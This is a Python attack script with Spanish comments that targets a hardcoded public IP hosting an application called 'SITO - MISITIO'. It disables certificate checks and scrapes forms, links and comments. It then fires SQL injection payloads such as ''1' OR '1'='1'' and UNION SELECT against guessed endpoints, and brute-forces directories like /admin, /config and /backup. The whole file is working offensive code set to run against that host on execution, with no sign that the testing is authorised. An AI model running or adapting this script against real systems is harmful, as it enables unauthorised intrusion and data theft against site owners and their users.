import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SitioAppAnalyzer:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def analyze_sitio_application(self):
        """Analiza la aplicación personalizada 'SITO - MISITIO'"""
        print("[*] Analizando aplicación 'SITO - MISITIO'...")
        
        try:
            # Obtener página principal
            response = self.session.get(self.base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Buscar información sensible
            print("[+] Información de la aplicación:")
            
            # Título
            title = soup.find('title')
            if title:
                print(f"    Título: {title.text}")
            
            # Formularios
            forms = soup.find_all('form')
            print(f"    Formularios encontrados: {len(forms)}")
            
            for i, form in enumerate(forms):
                action = form.get('action', 'No action')
                method = form.get('method', 'GET')
                print(f"      Form {i+1}: {method} -> {action}")
                
                # Inputs del formulario
                inputs = form.find_all('input')
                for inp in inputs:
                    name = inp.get('name', 'No name')
                    type_ = inp.get('type', 'text')
                    print(f"        Input: {name} ({type_})")
            
            # Enlaces
            links = soup.find_all('a', href=True)
            print(f"    Enlaces encontrados: {len(links)}")
            
            interesting_links = []
            for link in links[:10]:  # Mostrar primeros 10
                href = link['href']
                if not href.startswith(('http', '#')):
                    interesting_links.append(href)
                    print(f"      Enlace: {href}")
            
            # Scripts
            scripts = soup.find_all('script')
            print(f"    Scripts encontrados: {len(scripts)}")
            
            # Buscar comentarios HTML
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
            for comment in comments[:3]:
                print(f"    Comentario: {comment.strip()[:100]}...")
                
        except Exception as e:
            print(f"[-] Error analizando aplicación: {e}")

    def test_sql_injection_sito(self):
        """Prueba SQL injection en la aplicación SITO"""
        print("\n[*] Probando SQL injection en aplicación SITO...")
        
        # Parámetros comunes
        test_params = {
            'id': ["1'", "1' OR '1'='1", "1' UNION SELECT 1,2,3--"],
            'user': ["admin'--", "admin' OR '1'='1"],
            'name': ["test'", "test' AND 1=1--"],
            'search': ["%25%27", "' OR 1=1--"]
        }
        
        # Primero obtener la página para ver parámetros
        try:
            response = self.session.get(self.base_url, timeout=5)
            if '?' in response.url:
                base_url = response.url.split('?')[0]
                # Probar parámetros existentes
                pass
            else:
                # Probar URLs comunes
                common_urls = [
                    f"{self.base_url}/login",
                    f"{self.base_url}/admin", 
                    f"{self.base_url}/search",
                    f"{self.base_url}/product",
                    f"{self.base_url}/user"
                ]
                
                for url in common_urls:
                    self.test_injection_on_url(url, test_params)
                    
        except Exception as e:
            print(f"[-] Error SQL injection: {e}")

    def test_injection_on_url(self, url, test_params):
        """Prueba inyección en URL específica"""
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[+] Probando inyección en: {url}")
                
                for param, payloads in test_params.items():
                    for payload in payloads:
                        test_url = f"{url}?{param}={payload}"
                        try:
                            inj_response = self.session.get(test_url, timeout=5)
                            if any(error in inj_response.text.lower() for error in ['sql', 'error', 'exception', 'mysql', 'ora-']):
                                print(f"[!] Posible SQL injection: {test_url}")
                        except:
                            pass
        except:
            pass

    def directory_brute_sito(self):
        """Fuerza bruta de directorios en la aplicación"""
        print("\n[*] Fuerza bruta de directorios SITO...")
        
        common_dirs = [
            "/admin", "/login", "/dashboard", "/config", "/backup",
            "/uploads", "/images", "/css", "/js", "/include",
            "/php", "/cgi-bin", "/web-inf", "/meta-inf",
            "/database", "/sql", "/back", "/old", "/test",
            "/api", "/webservice", "/service", "/ws"
        ]
        
        for directory in common_dirs:
            url = f"{self.base_url}{directory}"
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    print(f"[+] Directorio encontrado: {directory}")
                elif response.status_code == 403:
                    print(f"[!] Acceso prohibido: {directory}")
                elif response.status_code == 301 or response.status_code == 302:
                    print(f"[+] Redirección: {directory} -> {response.headers.get('Location')}")
            except:
                pass

# Ejecutar análisis de SITO
sito_analyzer = SitioAppAnalyzer("189.254.143.102")
sito_analyzer.analyze_sitio_application()
sito_analyzer.test_sql_injection_sito()
sito_analyzer.directory_brute_sito()